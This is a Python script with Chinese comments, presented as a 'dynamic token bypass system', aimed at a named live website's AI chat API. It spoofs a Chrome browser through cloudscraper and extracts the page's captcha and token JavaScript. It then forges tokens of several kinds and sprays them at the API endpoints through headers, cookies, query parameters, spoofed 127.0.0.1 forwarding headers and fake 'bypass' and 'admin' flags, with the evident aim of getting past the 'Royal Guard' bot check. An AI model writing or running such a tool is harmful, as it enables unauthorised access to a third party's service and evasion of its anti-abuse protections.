#!/usr/bin/env python3
"""
动态 Token 生成和校验绕过系统
==========================
专门针对前端 token 生成和校验的绕过系统
"""

import cloudscraper
import json
import time
import random
import string
import base64
import hashlib
import hmac
import re
import uuid
from datetime import datetime, timedelta
from urllib.parse import urljoin, urlparse, parse_qs
import requests
from bs4 import BeautifulSoup
import execjs

class DynamicTokenBypass:
    def __init__(self):
        self.base_url = "https://iwoozie.baby"
        self.session = cloudscraper.create_scraper(
            browser={
                'browser': 'chrome',
                'platform': 'windows',
                'mobile': False
            }
        )
        
        # 设置更真实的浏览器头
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0'
        })
        
        self.results = {
            'total_attempts': 0,
            'successful_bypasses': 0,
            'failed_attempts': 0,
            'bypassed_methods': [],
            'failed_methods': [],
            'extracted_tokens': [],
            'js_functions': {}
        }
    
    def print_header(self):
        print("=" * 80)
        print("🔓 动态 Token 生成和校验绕过系统")
        print("=" * 80)
        print("🎯 目标: 绕过前端 token 生成和校验机制")
        print("⏰ 时间:", datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
        print("=" * 80)
        print()
    
    def extract_js_token_logic(self, html_content):
        """提取 JavaScript token 生成逻辑"""
        print("🔍 提取 JavaScript token 生成逻辑...")
        
        # 查找 Royal Guard 相关的 JavaScript
        rg_js_patterns = [
            r'window\.__BotChallenger__\s*=\s*{[^}]+}',
            r'function\s+getToken[^{]*{[^}]+}',
            r'window\.RGD_Done\s*=\s*[^;]+',
            r'function\s+submitForm[^{]*{[^}]+}',
            r'captchaForm[^{]*{[^}]+}',
            r'token[^{]*{[^}]+}',
            r'verification[^{]*{[^}]+}'
        ]
        
        extracted_js = {}
        for pattern in rg_js_patterns:
            matches = re.findall(pattern, html_content, re.DOTALL | re.IGNORECASE)
            if matches:
                function_name = pattern.split('\\')[0].replace('r', '').replace('\\', '')
                extracted_js[function_name] = matches[0]
                print(f"  ✅ 提取到: {function_name}")
        
        # 查找 token 相关的变量和函数
        token_patterns = [
            r'var\s+token\s*=\s*[^;]+',
            r'let\s+token\s*=\s*[^;]+',
            r'const\s+token\s*=\s*[^;]+',
            r'token\s*:\s*[^,}]+',
            r'"token"\s*:\s*[^,}]+',
            r"'token'\s*:\s*[^,}]+"
        ]
        
        for pattern in token_patterns:
            matches = re.findall(pattern, html_content, re.IGNORECASE)
            if matches:
                print(f"  🔍 发现 token 变量: {matches[0][:50]}...")
        
        self.results['js_functions'] = extracted_js
        return extracted_js
    
    def analyze_token_validation(self, html_content):
        """分析 token 验证逻辑"""
        print("🔍 分析 token 验证逻辑...")
        
        # 查找验证相关的代码
        validation_patterns = [
            r'if\s*\(\s*token\s*\)',
            r'if\s*\(\s*success\s*\)',
            r'if\s*\(\s*verification\s*\)',
            r'token\s*===\s*[^)]+',
            r'token\s*!==\s*[^)]+',
            r'validateToken[^{]*{[^}]+}',
            r'checkToken[^{]*{[^}]+}',
            r'verifyToken[^{]*{[^}]+}'
        ]
        
        for pattern in validation_patterns:
            matches = re.findall(pattern, html_content, re.DOTALL | re.IGNORECASE)
            if matches:
                print(f"  🔍 发现验证逻辑: {matches[0][:50]}...")
        
        # 查找 API 调用
        api_patterns = [
            r'fetch\s*\(\s*["\'][^"\']*api[^"\']*["\']',
            r'XMLHttpRequest[^{]*{[^}]+}',
            r'axios\.[^(]*\(',
            r'\.post\s*\(\s*["\'][^"\']*api[^"\']*["\']',
            r'\.get\s*\(\s*["\'][^"\']*api[^"\']*["\']'
        ]
        
        for pattern in api_patterns:
            matches = re.findall(pattern, html_content, re.DOTALL | re.IGNORECASE)
            if matches:
                print(f"  🔍 发现 API 调用: {matches[0][:50]}...")
    
    def generate_advanced_tokens(self):
        """生成高级伪造 token"""
        print("🎭 生成高级伪造 token...")
        
        tokens = []
        
        # 1. 基于时间戳的 token
        timestamp = int(time.time())
        tokens.append({
            'type': 'timestamp',
            'value': hashlib.md5(str(timestamp).encode()).hexdigest(),
            'description': '基于时间戳的 MD5 token'
        })
        
        # 2. 基于会话的 token
        session_id = str(uuid.uuid4()).replace('-', '')
        tokens.append({
            'type': 'session',
            'value': hashlib.sha256(session_id.encode()).hexdigest(),
            'description': '基于会话的 SHA256 token'
        })
        
        # 3. 基于 HMAC 的 token
        message = f"bypass_{timestamp}_{random.randint(1000, 9999)}"
        key = "royal_guard_secret_key"
        hmac_token = hmac.new(key.encode(), message.encode(), hashlib.sha256).hexdigest()
        tokens.append({
            'type': 'hmac',
            'value': hmac_token,
            'description': '基于 HMAC 的 token'
        })
        
        # 4. 基于 JWT 风格的 token
        header = base64.b64encode(json.dumps({"alg": "HS256", "typ": "JWT"}).encode()).decode()
        payload = base64.b64encode(json.dumps({
            "user_id": random.randint(1000, 9999),
            "timestamp": timestamp,
            "exp": timestamp + 3600
        }).encode()).decode()
        signature = hashlib.sha256(f"{header}.{payload}.secret".encode()).hexdigest()
        jwt_token = f"{header}.{payload}.{signature}"
        tokens.append({
            'type': 'jwt',
            'value': jwt_token,
            'description': 'JWT 风格的 token'
        })
        
        # 5. 基于 Base64 编码的 token
        data = {
            "token": str(uuid.uuid4()),
            "timestamp": timestamp,
            "user": "bypass_user",
            "role": "admin"
        }
        b64_token = base64.b64encode(json.dumps(data).encode()).decode()
        tokens.append({
            'type': 'base64',
            'value': b64_token,
            'description': 'Base64 编码的 token'
        })
        
        # 6. 基于随机字符串的 token
        random_token = ''.join(random.choices(string.ascii_letters + string.digits, k=64))
        tokens.append({
            'type': 'random',
            'value': random_token,
            'description': '随机字符串 token'
        })
        
        # 7. 基于 UUID 的 token
        uuid_token = str(uuid.uuid4()).replace('-', '')
        tokens.append({
            'type': 'uuid',
            'value': uuid_token,
            'description': 'UUID 风格的 token'
        })
        
        # 8. 基于多重哈希的 token
        data = f"multi_hash_{timestamp}_{random.randint(1000, 9999)}"
        hash1 = hashlib.md5(data.encode()).hexdigest()
        hash2 = hashlib.sha256(hash1.encode()).hexdigest()
        hash3 = hashlib.sha1(hash2.encode()).hexdigest()
        multi_hash_token = hash3
        tokens.append({
            'type': 'multi_hash',
            'value': multi_hash_token,
            'description': '多重哈希 token'
        })
        
        for token in tokens:
            print(f"  ✅ {token['type']}: {token['value'][:20]}...")
        
        self.results['extracted_tokens'] = tokens
        return tokens
    
    def test_token_validation_bypass(self, tokens):
        """测试 token 验证绕过"""
        print("🎯 测试 token 验证绕过...")
        
        for i, token_info in enumerate(tokens):
            token = token_info['value']
            token_type = token_info['type']
            
            print(f"  测试 token {i+1}/{len(tokens)} ({token_type}): {token[:20]}...")
            
            # 测试多种绕过方法
            bypass_methods = [
                self.test_direct_api_bypass,
                self.test_header_injection_bypass,
                self.test_cookie_injection_bypass,
                self.test_parameter_pollution_bypass,
                self.test_session_hijacking_bypass,
                self.test_form_submission_bypass
            ]
            
            for method in bypass_methods:
                if method(token, token_type):
                    return True
            
            time.sleep(0.5)
        
        return False
    
    def test_direct_api_bypass(self, token, token_type):
        """测试直接 API 绕过"""
        print("    🔍 测试直接 API 绕过...")
        
        # 多种请求头组合
        header_combinations = [
            {'x-api-key': token},
            {'Authorization': f'Bearer {token}'},
            {'x-auth-token': token},
            {'x-token': token},
            {'api-key': token},
            {'token': token},
            {'x-access-token': token},
            {'x-session-token': token},
            {'x-verification-token': token},
            {'x-captcha-token': token},
            {'x-royal-guard-token': token}
        ]
        
        data = {
            "Content": [{
                "role": "user", 
                "content": "Hello, this is a test message"
            }]
        }
        
        api_endpoints = [
            '/api/quick/createAITask?model=GPT-4',
            '/api/quick/createAITask?model=Grok-4-Fast',
            '/api/chat',
            '/api/ai/chat',
            '/api/v1/chat',
            '/api/v2/chat'
        ]
        
        for endpoint in api_endpoints:
            for headers in header_combinations:
                try:
                    url = urljoin(self.base_url, endpoint)
                    response = self.session.post(url, json=data, headers=headers, timeout=10)
                    
                    self.results['total_attempts'] += 1
                    
                    if response.status_code == 200:
                        try:
                            response_json = response.json()
                            if 'code' in response_json and response_json['code'] == 200:
                                print(f"    ✅ 成功绕过: {endpoint} with {list(headers.keys())[0]}")
                                self.results['successful_bypasses'] += 1
                                self.results['bypassed_methods'].append(f"direct_api_bypass: {endpoint} with {list(headers.keys())[0]}")
                                return True
                        except:
                            pass
                    
                    self.results['failed_attempts'] += 1
                    self.results['failed_methods'].append(f"direct_api_bypass: {endpoint} with {list(headers.keys())[0]}")
                    
                except Exception as e:
                    self.results['failed_attempts'] += 1
                    self.results['failed_methods'].append(f"direct_api_bypass: {endpoint} with {list(headers.keys())[0]} - {str(e)}")
        
        return False
    
    def test_header_injection_bypass(self, token, token_type):
        """测试请求头注入绕过"""
        print("    🔍 测试请求头注入绕过...")
        
        # 注入多种请求头
        injection_headers = {
            'x-api-key': token,
            'x-forwarded-for': '127.0.0.1',
            'x-real-ip': '127.0.0.1',
            'x-client-ip': '127.0.0.1',
            'x-remote-ip': '127.0.0.1',
            'x-originating-ip': '127.0.0.1',
            'x-verification': 'bypass',
            'x-bypass': '1',
            'x-admin': 'true',
            'x-debug': '1',
            'x-test': '1',
            'x-override': '1',
            'x-force': '1',
            'x-skip': '1',
            'x-ignore': '1',
            'x-bypass-captcha': '1',
            'x-bypass-verification': '1',
            'x-bypass-royal-guard': '1',
            'x-royal-guard-bypass': '1',
            'x-verification-bypass': '1',
            'x-captcha-bypass': '1'
        }
        
        data = {
            "Content": [{
                "role": "user", 
                "content": "Hello, this is a test message"
            }]
        }
        
        url = urljoin(self.base_url, '/api/quick/createAITask?model=GPT-4')
        
        try:
            response = self.session.post(url, json=data, headers=injection_headers, timeout=10)
            
            self.results['total_attempts'] += 1
            
            if response.status_code == 200:
                try:
                    response_json = response.json()
                    if 'code' in response_json and response_json['code'] == 200:
                        print("    ✅ 请求头注入成功")
                        self.results['successful_bypasses'] += 1
                        self.results['bypassed_methods'].append("header_injection_bypass")
                        return True
                except:
                    pass
            
            self.results['failed_attempts'] += 1
            self.results['failed_methods'].append("header_injection_bypass")
            
        except Exception as e:
            self.results['failed_attempts'] += 1
            self.results['failed_methods'].append(f"header_injection_bypass - {str(e)}")
        
        return False
    
    def test_cookie_injection_bypass(self, token, token_type):
        """测试 Cookie 注入绕过"""
        print("    🔍 测试 Cookie 注入绕过...")
        
        # 设置多种 Cookie
        cookies = {
            'captcha_token': token,
            'session_id': token,
            'auth_token': token,
            'verification': 'passed',
            'royal_guard': 'bypassed',
            'token': token,
            'api_key': token,
            'access_token': token,
            'session_token': token,
            'verification_token': token,
            'bypass_token': token,
            'admin_token': token
        }
        
        for name, value in cookies.items():
            self.session.cookies.set(name, value)
        
        data = {
            "Content": [{
                "role": "user", 
                "content": "Hello, this is a test message"
            }]
        }
        
        url = urljoin(self.base_url, '/api/quick/createAITask?model=GPT-4')
        
        try:
            response = self.session.post(url, json=data, timeout=10)
            
            self.results['total_attempts'] += 1
            
            if response.status_code == 200:
                try:
                    response_json = response.json()
                    if 'code' in response_json and response_json['code'] == 200:
                        print("    ✅ Cookie 注入成功")
                        self.results['successful_bypasses'] += 1
                        self.results['bypassed_methods'].append("cookie_injection_bypass")
                        return True
                except:
                    pass
            
            self.results['failed_attempts'] += 1
            self.results['failed_methods'].append("cookie_injection_bypass")
            
        except Exception as e:
            self.results['failed_attempts'] += 1
            self.results['failed_methods'].append(f"cookie_injection_bypass - {str(e)}")
        
        return False
    
    def test_parameter_pollution_bypass(self, token, token_type):
        """测试参数污染绕过"""
        print("    🔍 测试参数污染绕过...")
        
        # 多种参数污染
        pollution_params = [
            {'model': 'GPT-4', 'token': token},
            {'model': 'GPT-4', 'api_key': token},
            {'model': 'GPT-4', 'auth_token': token},
            {'model': 'GPT-4', 'verification': 'passed'},
            {'model': 'GPT-4', 'bypass': '1'},
            {'model': 'GPT-4', 'admin': 'true'},
            {'model': 'GPT-4', 'debug': '1'},
            {'model': 'GPT-4', 'test': '1'},
            {'model': 'GPT-4', 'override': '1'},
            {'model': 'GPT-4', 'force': '1'},
            {'model': 'GPT-4', 'skip': '1'},
            {'model': 'GPT-4', 'ignore': '1'},
            {'model': 'GPT-4', 'bypass_captcha': '1'},
            {'model': 'GPT-4', 'bypass_verification': '1'},
            {'model': 'GPT-4', 'bypass_royal_guard': '1'},
            {'model': 'GPT-4', 'royal_guard_bypass': '1'},
            {'model': 'GPT-4', 'verification_bypass': '1'},
            {'model': 'GPT-4', 'captcha_bypass': '1'}
        ]
        
        data = {
            "Content": [{
                "role": "user", 
                "content": "Hello, this is a test message"
            }]
        }
        
        for params in pollution_params:
            try:
                url = urljoin(self.base_url, '/api/quick/createAITask')
                response = self.session.post(url, json=data, params=params, timeout=10)
                
                self.results['total_attempts'] += 1
                
                if response.status_code == 200:
                    try:
                        response_json = response.json()
                        if 'code' in response_json and response_json['code'] == 200:
                            print(f"    ✅ 参数污染成功: {params}")
                            self.results['successful_bypasses'] += 1
                            self.results['bypassed_methods'].append(f"parameter_pollution_bypass: {params}")
                            return True
                    except:
                        pass
                
                self.results['failed_attempts'] += 1
                self.results['failed_methods'].append(f"parameter_pollution_bypass: {params}")
                
            except Exception as e:
                self.results['failed_attempts'] += 1
                self.results['failed_methods'].append(f"parameter_pollution_bypass: {params} - {str(e)}")
        
        return False
    
    def test_session_hijacking_bypass(self, token, token_type):
        """测试会话劫持绕过"""
        print("    🔍 测试会话劫持绕过...")
        
        # 设置会话相关的请求头
        session_headers = {
            'x-api-key': token,
            'x-session-id': token,
            'x-auth-token': token,
            'x-verification-token': token,
            'x-captcha-token': token,
            'x-royal-guard-token': token,
            'x-bypass-token': token,
            'x-admin-token': token
        }
        
        # 设置会话相关的 Cookie
        session_cookies = {
            'captcha_token': token,
            'session_id': token,
            'auth_token': token,
            'verification': 'passed',
            'royal_guard': 'bypassed',
            'token': token,
            'api_key': token,
            'access_token': token,
            'session_token': token,
            'verification_token': token,
            'bypass_token': token,
            'admin_token': token
        }
        
        for name, value in session_cookies.items():
            self.session.cookies.set(name, value)
        
        data = {
            "Content": [{
                "role": "user", 
                "content": "Hello, this is a test message"
            }]
        }
        
        url = urljoin(self.base_url, '/api/quick/createAITask?model=GPT-4')
        
        try:
            response = self.session.post(url, json=data, headers=session_headers, timeout=10)
            
            self.results['total_attempts'] += 1
            
            if response.status_code == 200:
                try:
                    response_json = response.json()
                    if 'code' in response_json and response_json['code'] == 200:
                        print("    ✅ 会话劫持成功")
                        self.results['successful_bypasses'] += 1
                        self.results['bypassed_methods'].append("session_hijacking_bypass")
                        return True
                except:
                    pass
            
            self.results['failed_attempts'] += 1
            self.results['failed_methods'].append("session_hijacking_bypass")
            
        except Exception as e:
            self.results['failed_attempts'] += 1
            self.results['failed_methods'].append(f"session_hijacking_bypass - {str(e)}")
        
        return False
    
    def test_form_submission_bypass(self, token, token_type):
        """测试表单提交绕过"""
        print("    🔍 测试表单提交绕过...")
        
        try:
            # 先访问验证页面
            response = self.session.get(f"{self.base_url}/chat", timeout=10)
            
            if response.status_code == 200:
                # 提交验证码表单
                form_data = {
                    'captcha_token': token
                }
                
                response = self.session.post(f"{self.base_url}/chat", data=form_data, timeout=10)
                
                self.results['total_attempts'] += 1
                
                if response.status_code == 200:
                    # 检查是否重定向到聊天页面
                    if 'chat' in response.url and 'verification' not in response.text.lower():
                        print("    ✅ 表单提交成功，可能已绕过验证")
                        self.results['successful_bypasses'] += 1
                        self.results['bypassed_methods'].append("form_submission_bypass")
                        return True
                
                self.results['failed_attempts'] += 1
                self.results['failed_methods'].append("form_submission_bypass")
            
        except Exception as e:
            self.results['failed_attempts'] += 1
            self.results['failed_methods'].append(f"form_submission_bypass - {str(e)}")
        
        return False
    
    def run_comprehensive_bypass(self):
        """运行综合绕过测试"""
        self.print_header()
        
        print("🚀 开始动态 Token 绕过测试...")
        print()
        
        # 步骤1: 访问验证页面
        print("📄 步骤1: 访问验证页面...")
        try:
            response = self.session.get(f"{self.base_url}/chat", timeout=15)
            print(f"  状态码: {response.status_code}")
            print(f"  URL: {response.url}")
            
            if response.status_code == 200:
                print("  ✅ 成功访问验证页面")
                
                # 提取 JavaScript token 生成逻辑
                js_functions = self.extract_js_token_logic(response.text)
                
                # 分析 token 验证逻辑
                self.analyze_token_validation(response.text)
                
            else:
                print("  ❌ 无法访问验证页面")
                return
                
        except Exception as e:
            print(f"  💥 访问异常: {str(e)}")
            return
        
        print()
        
        # 步骤2: 生成高级伪造 token
        print("🎭 步骤2: 生成高级伪造 token...")
        tokens = self.generate_advanced_tokens()
        print(f"  生成了 {len(tokens)} 个高级 token")
        print()
        
        # 步骤3: 测试 token 验证绕过
        print("🎯 步骤3: 测试 token 验证绕过...")
        success = self.test_token_validation_bypass(tokens)
        
        print()
        
        # 生成报告
        self.generate_report()
    
    def generate_report(self):
        """生成测试报告"""
        print("=" * 80)
        print("📋 动态 Token 绕过测试报告")
        print("=" * 80)
        
        # 基本统计
        total = self.results['total_attempts']
        success = self.results['successful_bypasses']
        failed = self.results['failed_attempts']
        success_rate = (success / total * 100) if total > 0 else 0
        
        print(f"📊 测试统计:")
        print(f"  总尝试次数: {total}")
        print(f"  成功绕过: {success}")
        print(f"  失败尝试: {failed}")
        print(f"  成功率: {success_rate:.1f}%")
        print()
        
        # 成功的绕过方法
        if self.results['bypassed_methods']:
            print(f"✅ 成功的绕过方法 ({len(self.results['bypassed_methods'])} 个):")
            for method in self.results['bypassed_methods']:
                print(f"  - {method}")
        else:
            print("❌ 没有成功的绕过方法")
        print()
        
        # 提取的 token 信息
        if self.results['extracted_tokens']:
            print(f"🎭 生成的 token 类型 ({len(self.results['extracted_tokens'])} 个):")
            for token_info in self.results['extracted_tokens']:
                print(f"  - {token_info['type']}: {token_info['value'][:20]}...")
        print()
        
        # 安全建议
        print(f"💡 安全建议:")
        if success_rate > 50:
            print("  🚨 系统存在严重漏洞，建议立即修复!")
            print("  1. 加强 token 验证机制")
            print("  2. 实施更严格的会话管理")
            print("  3. 添加 CloudScraper 检测")
            print("  4. 实施多层防护机制")
        elif success_rate > 20:
            print("  ⚠️  系统存在中等风险，建议尽快改进")
            print("  1. 完善 token 验证")
            print("  2. 加强会话管理")
            print("  3. 添加安全监控")
        else:
            print("  ✅ 系统安全状况良好")
            print("  1. 继续保持现有防护措施")
            print("  2. 定期进行安全审计")
            print("  3. 持续监控异常访问")
        
        print("\n" + "=" * 80)

def main():
    """主函数"""
    bypass = DynamicTokenBypass()
    bypass.run_comprehensive_bypass()

if __name__ == "__main__":
    main()
